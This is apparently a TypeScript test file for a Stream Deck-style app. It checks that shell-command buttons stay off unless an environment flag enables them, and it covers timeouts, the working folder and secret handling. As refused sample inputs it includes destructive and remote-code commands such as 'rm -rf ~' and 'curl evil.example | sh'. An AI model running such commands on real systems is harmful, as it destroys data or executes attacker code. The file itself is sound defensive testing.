// Run Command buttons: off unless the environment allows them, both when saving and when running.
import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';
import { ActionError } from '../server/actions/executor.ts';
import { systemExecutor } from '../server/actions/system.ts';
import { OpError, applyOp } from '../server/deck/ops.ts';
import { readEnv } from '../server/env.ts';
import { commandNotFound, commandProgram, outputTail, shellCommand } from '../server/system/command.ts';
import { actionAutoLabel, availableActionTypes } from '../shared/actions-meta.ts';
import { emptyExtState } from '../shared/ext-types.ts';
import { buttonVisual } from '../shared/feedback.ts';
import { emptyObsState } from '../shared/obs-types.ts';
import type { ActionOf, Deck } from '../shared/schema.ts';
import { seqId, tempDir } from './helpers.ts';

type Command = ActionOf<'system.command'>;

const cmd = (command: string, extra: Partial<Command> = {}): Command => ({ type: 'system.command', command, ...extra });

function deck(): Deck {
  return {
    version: 1,
    revision: 0,
    homePageId: 'p',
    pages: [
      {
        id: 'p',
        name: 'P',
        rows: 2,
        cols: 3,
        buttons: { '0-0': { id: 'lights', label: 'Lights', tap: cmd('~/bin/lights.sh') }, '0-1': { id: 'other', label: 'Other' } },
      },
    ],
  };
}

const off = { obs: emptyObsState(), newId: seqId };
const on = { ...off, commandsEnabled: true };

test('while commands are off, no command can be added, copied, changed or imported', () => {
  const refused = (fn: () => unknown) => assert.throws(fn, (err: Error) => err instanceof OpError && /STREAMDECK_ENABLE_COMMANDS=1/.test(err.message));
  const d = deck();
  refused(() => applyOp(d, { op: 'button.set', pageId: 'p', slot: '1-0', button: { tap: cmd('rm -rf ~') } }, off));
  refused(() => applyOp(d, { op: 'button.set', pageId: 'p', slot: '0-0', button: { id: 'lights', tap: cmd('~/bin/other.sh') } }, off));
  refused(() => applyOp(d, { op: 'button.duplicate', pageId: 'p', slot: '0-0' }, off));
  refused(() =>
    applyOp(d, { op: 'button.set', pageId: 'p', slot: '1-0', button: { tap: { type: 'macro', steps: [{ action: cmd('reboot') }], stopOnError: true } } }, off),
  );
  const imported = structuredClone(d);
  imported.pages[0].buttons['1-1'] = { id: 'x', longPress: cmd('curl evil.example | sh') };
  refused(() => applyOp(d, { op: 'deck.import', deck: imported }, off));

  // With commands on, all of that is fine.
  assert.ok(applyOp(d, { op: 'button.set', pageId: 'p', slot: '1-0', button: { tap: cmd('~/bin/other.sh') } }, on));
  assert.ok(applyOp(d, { op: 'button.duplicate', pageId: 'p', slot: '0-0' }, on));
});

test('while commands are off, the command buttons a deck already has can still be moved, relabeled or deleted', () => {
  const d = deck();
  const relabeled = applyOp(d, { op: 'button.set', pageId: 'p', slot: '0-0', button: { id: 'lights', label: 'Desk lights', tap: cmd('~/bin/lights.sh') } }, off);
  assert.equal(relabeled.deck.pages[0].buttons['0-0'].label, 'Desk lights');
  const moved = applyOp(d, { op: 'button.move', from: { pageId: 'p', slot: '0-0' }, to: { pageId: 'p', slot: '1-2' } }, off);
  assert.equal(moved.deck.pages[0].buttons['1-2'].id, 'lights');
  assert.ok(applyOp(d, { op: 'button.set', pageId: 'p', slot: '0-1', button: { id: 'other', label: 'Renamed' } }, off), 'other edits still work');
  const deleted = applyOp(d, { op: 'button.set', pageId: 'p', slot: '0-0', button: null }, off);
  assert.equal(deleted.deck.pages[0].buttons['0-0'], undefined);
});

test('only STREAMDECK_ENABLE_COMMANDS=1 turns commands on', () => {
  assert.equal(readEnv({ STREAMDECK_ENABLE_COMMANDS: '1' }).commandsEnabled, true);
  for (const value of [undefined, '', '0', 'true', 'yes']) assert.equal(readEnv({ STREAMDECK_ENABLE_COMMANDS: value }).commandsEnabled, false);
});

test('the editor only offers Run Command when the server allows it; such buttons are dimmed otherwise', () => {
  assert.equal(availableActionTypes(false).includes('system.command'), false);
  assert.equal(availableActionTypes(true).includes('system.command'), true);
  const look = (commands?: boolean) =>
    buttonVisual({ id: 'x', tap: cmd('true') }, { obs: emptyObsState(), deck: deck(), ext: emptyExtState(), now: 0, commands });
  assert.equal(look(false).disabled, true);
  assert.equal(look(undefined).disabled, true);
  assert.equal(look(true).disabled, false);
  assert.equal(look(true).label, 'true');
});

const run = (commandsEnabled: boolean, action: Command) =>
  systemExecutor({ run: async () => ({ code: 0, stdout: '', stderr: '' }), audio: { refresh: async () => {} }, commandsEnabled })(action, { kind: 'press' });

// The same commands for sh (Linux) and cmd.exe (Windows).
const win = process.platform === 'win32';
const sleep1 = win ? 'ping -n 2 127.0.0.1 >nul' : 'sleep 1';
const touch = (file: string) => (win ? `type nul > "${file}"` : `touch '${file}'`);

test('the executor refuses to run anything while commands are off', async (t) => {
  const tmp = await tempDir();
  t.after(tmp.cleanup);
  const marker = join(tmp.dir, 'ran');
  await assert.rejects(run(false, cmd(touch(marker))), (err: Error) => err instanceof ActionError && /turned off/.test(err.message));
  assert.equal(existsSync(marker), false);
});

test('commands run in the home folder; failures show the exit code and the end of stderr', async () => {
  await run(true, cmd(win ? 'echo hello && if /i not "%CD%"=="%USERPROFILE%" exit 5' : 'echo hello && test "$(pwd)" = "$HOME"'));
  await assert.rejects(
    run(true, cmd(win ? '(echo first line)1>&2 & (echo what went wrong)1>&2 & exit 3' : 'echo "first line" >&2; echo "what went wrong" >&2; exit 3')),
    (err: Error) => err instanceof ActionError && err.message === 'The command failed (exit code 3):\nfirst line\nwhat went wrong',
  );
});

test('the deck’s OBS password is not passed on to commands', async () => {
  const before = process.env.OBS_PASSWORD;
  process.env.OBS_PASSWORD = 'hunter2';
  try {
    await run(true, cmd(win ? 'if defined OBS_PASSWORD exit 1' : 'test -z "$OBS_PASSWORD"'));
  } finally {
    if (before === undefined) delete process.env.OBS_PASSWORD;
    else process.env.OBS_PASSWORD = before;
  }
});

test('a command that takes too long is stopped, including what it started', async (t) => {
  const tmp = await tempDir();
  t.after(tmp.cleanup);
  const marker = join(tmp.dir, 'late');
  const started = Date.now();
  await assert.rejects(run(true, cmd(`${sleep1} && ${touch(marker)}`, { timeoutMs: 1000 / 4 })), /stopped after 0.25 s/);
  assert.ok(Date.now() - started < 1000);
  await new Promise((r) => setTimeout(r, 1500));
  assert.equal(existsSync(marker), false, 'the sleeping child was stopped too');
});

test('a command that leaves something running in the background does not hang the button', async () => {
  const started = Date.now();
  await run(true, cmd(win ? `start "" /b ${sleep1}` : `${sleep1} &`));
  assert.ok(Date.now() - started < 1000);
});

test('detached commands start and return; a missing program is reported', async (t) => {
  const tmp = await tempDir();
  t.after(tmp.cleanup);
  const marker = join(tmp.dir, 'launched');
  await run(true, cmd(win ? `ping -n 1 127.0.0.1 >nul && ${touch(marker)}` : `sleep 0.2 && ${touch(marker)}`, { detached: true }));
  assert.equal(existsSync(marker), true, 'it ran (and quick exits are waited for)');
  await assert.rejects(run(true, cmd('definitely-not-a-program-xyz --flag', { detached: true })), /Command not found: definitely-not-a-program-xyz/);
});

test('each system has its shell', () => {
  assert.deepEqual(shellCommand('echo "hi" && ls', 'linux'), { file: 'sh', args: ['-c', 'echo "hi" && ls'] });
  const cmdExe = shellCommand('echo "hi" && dir', 'win32');
  assert.deepEqual(cmdExe.args, ['/d', '/s', '/c', '"echo "hi" && dir"'], 'cmd.exe /s strips just the outer quotes');
  assert.equal(outputTail('one\r\ntwo\r\nthree\r\nfour\r\n'), 'two\nthree\nfour', 'Windows line ends');
  assert.equal(commandProgram('  "C:\\Program Files\\app.exe" --x'), 'C:\\Program Files\\app.exe');
  assert.equal(commandProgram('notepad&& echo hi'), 'notepad');
});

test('a quick failure is "not found" by the shell’s exit code (and on Windows by looking the program up)', async () => {
  assert.equal(await commandNotFound('nope', 127, 'linux'), true);
  assert.equal(await commandNotFound('ls', 2, 'linux'), false);
  assert.equal(await commandNotFound('nope', 9009, 'win32'), true);
  if (win) {
    assert.equal(await commandNotFound('definitely-not-a-program-xyz', 1, 'win32'), true);
    assert.equal(await commandNotFound('cmd /c exit 1', 1, 'win32'), false, 'it exists; it just failed');
    assert.equal(await commandNotFound('start "" nothing', 1, 'win32'), false, 'cmd.exe’s own commands count as found');
  }
});

test('Run Command labels name the program, also for Windows paths', () => {
  const label = (command: string) => actionAutoLabel(cmd(command), {});
  assert.equal(label('~/bin/lights-on.sh --bright'), 'lights-on.sh');
  assert.equal(label('C:\\Tools\\lights.bat on'), 'lights.bat');
  assert.equal(label('"C:\\Program Files\\obs-studio\\bin\\64bit\\obs64.exe" --startreplaybuffer'), 'obs64.exe');
  assert.equal(label('   '), 'Command');
});
